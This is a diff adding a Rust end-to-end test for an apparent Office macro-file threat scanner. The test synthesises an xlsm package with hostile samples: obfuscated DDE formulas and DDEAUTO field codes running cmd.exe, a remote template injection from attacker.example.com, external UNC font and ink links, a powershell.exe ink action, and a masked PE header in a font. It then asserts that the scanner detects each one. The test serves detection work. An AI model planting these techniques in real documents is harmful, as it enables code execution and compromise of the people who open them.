@@ -3969,3 +3969,234 @@ fn e2e_smuggled_payload_view_evasion_activex_and_array_stacking_inspection() {
         "JSON missing VBA-CELL-034"
     );
 }
+
+#[test]
+fn e2e_glossary_font_ink_and_sequence_threat_inspection() {
+    let sheet_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1">
+        <f>=CONCAT(SINGLE({"c"}), SINGLE({"m"}), SINGLE({"d"}), ".exe|'/c calc'!A0")</f>
+      </c>
+      <c r="A2">
+        <f>=INDEX(SEQUENCE(2, 3, 10, 5), 1, 1)</f>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    let workbook_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let glossary_doc_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:glossaryDocument xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:docParts>
+    <w:docPart>
+      <w:docPartBody>
+        <w:p>
+          <w:fldSimple w:instr="DDEAUTO &quot;C:\\Windows\\System32\\cmd.exe&quot; &quot;/c calc.exe&quot;"/>
+        </w:p>
+      </w:docPartBody>
+    </w:docPart>
+  </w:docParts>
+</w:glossaryDocument>"#;
+
+    let glossary_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://attacker.example.com/exploit.dotm" TargetMode="External"/>
+</Relationships>"#;
+
+    let font_table_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="\\192.168.1.50\fonts\malicious.ttf" TargetMode="External"/>
+</Relationships>"#;
+
+    // Synthesize obfuscated ODTTF with GUID {12345678-1234-1234-1234-123456789abc}
+    // GUID bytes: [0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x12, 0x34, 0x12, 0x34, 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc]
+    // Reversed key: key[0] = 0xbc, key[1] = 0x9a, ...
+    let guid_bytes: [u8; 16] = [
+        0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x12, 0x34, 0x12, 0x34, 0x12, 0x34, 0x56, 0x78, 0x9a,
+        0xbc,
+    ];
+    let mut rev_key = [0u8; 16];
+    for i in 0..16 {
+        rev_key[i] = guid_bytes[15 - i];
+    }
+    let mut odttf_data = vec![0u8; 64];
+    // Plain bytes start with MZ (0x4D, 0x5A)
+    odttf_data[0] = b'M' ^ rev_key[0];
+    odttf_data[1] = b'Z' ^ rev_key[1];
+    for i in 2..32 {
+        odttf_data[i] = rev_key[i % 16];
+    }
+
+    let ink_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<ink xmlns="http://schemas.openxmlformats.org/ink/2010/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
+  <context xml:id="ctx1"/>
+  <trace xml:id="tr1">
+    <a:hlinkClick action="ppaction://program?name=powershell.exe"/>
+  </trace>
+</ink>"#;
+
+    let ink_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/custom" Target="\\10.10.10.10\share\ink_payload" TargetMode="External"/>
+</Relationships>"#;
+
+    let content_types = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="odttf" ContentType="application/vnd.openxmlformats-officedocument.obfuscatedFont"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+  <Override PartName="/word/glossary/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.glossary+xml"/>
+</Types>"#;
+
+    let root_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let wb_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    let project_bytes = synthesize_cfb_project(
+        "VBAProject",
+        &[("Module1", "Sub AutoOpen()\nEnd Sub\n", &[])],
+        &[],
+    );
+
+    let entries: Vec<(&str, &[u8])> = vec![
+        ("[Content_Types].xml", content_types),
+        ("_rels/.rels", root_rels),
+        ("xl/_rels/workbook.xml.rels", wb_rels),
+        ("xl/workbook.xml", workbook_xml),
+        ("xl/worksheets/sheet1.xml", sheet_xml),
+        ("word/glossary/document.xml", glossary_doc_xml),
+        ("word/glossary/_rels/document.xml.rels", glossary_rels),
+        ("word/_rels/fontTable.xml.rels", font_table_rels),
+        (
+            "word/fonts/{12345678-1234-1234-1234-123456789abc}.odttf",
+            &odttf_data,
+        ),
+        ("word/ink/ink1.xml", ink_xml),
+        ("word/ink/_rels/ink1.xml.rels", ink_rels),
+        ("xl/vbaProject.bin", &project_bytes),
+    ];
+
+    let zip_bytes = synthesize_zip(&entries);
+    let options = AnalysisOptions {
+        limits: Limits::default(),
+        host_profile: HostProfile::Excel,
+        ..Default::default()
+    };
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("Inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify GlossaryDocumentAnomaly (VBA-CELL-035)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "GlossaryDocumentAnomaly"
+                && t.coordinate
+                    .contains("part:word/glossary/document.xml:glossary:fieldCodeDDE")
+                && t.severity == "Critical"),
+        "Should detect DDE field code in word glossary document: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "GlossaryDocumentAnomaly"
+                && t.coordinate.contains(
+                    "part:word/glossary/_rels/document.xml.rels:glossary:templateInjection"
+                )
+                && t.severity == "Critical"),
+        "Should detect template injection in word glossary relationships: {threats:?}"
+    );
+
+    // 2. Verify EmbeddedFontSmuggling (VBA-CELL-036)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "EmbeddedFontSmuggling"
+                && t.coordinate
+                    .contains("part:word/_rels/fontTable.xml.rels:font:uncShare")
+                && t.severity == "High"),
+        "Should detect external UNC path in fontTable relationships: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "EmbeddedFontSmuggling"
+                && t.coordinate.contains("font:odttfPePayload")
+                && t.severity == "Critical"),
+        "Should detect de-masked PE executable in ODTTF font stream: {threats:?}"
+    );
+
+    // 3. Verify DigitalInkDefinitionAnomaly (VBA-CELL-037)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "DigitalInkDefinitionAnomaly"
+                && t.coordinate
+                    .contains("part:word/ink/ink1.xml:ink:actionTrigger")
+                && t.severity == "Critical"),
+        "Should detect command action trigger in digital ink annotation: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "DigitalInkDefinitionAnomaly"
+                && t.coordinate
+                    .contains("part:word/ink/_rels/ink1.xml.rels:ink:uncPath")
+                && t.severity == "High"),
+        "Should detect remote UNC path in digital ink relationship: {threats:?}"
+    );
+
+    // 4. Verify Dynamic Formula De-obfuscation via SINGLE and CONCAT in A1
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c calc'!A0")),
+        "Cell A1 should resolve DDE through SINGLE and CONCAT evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-035, VBA-CELL-036, VBA-CELL-037
+    let sarif = inspection_to_sarif(&inspection, "file:///test/glossary_font_ink.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-035"),
+        "SARIF must contain VBA-CELL-035 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-036"),
+        "SARIF must contain VBA-CELL-036 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-037"),
+        "SARIF must contain VBA-CELL-037 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-035, VBA-CELL-036, VBA-CELL-037
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-035\""),
+        "JSON missing VBA-CELL-035"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-036\""),
+        "JSON missing VBA-CELL-036"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-037\""),
+        "JSON missing VBA-CELL-037"
+    );
+}
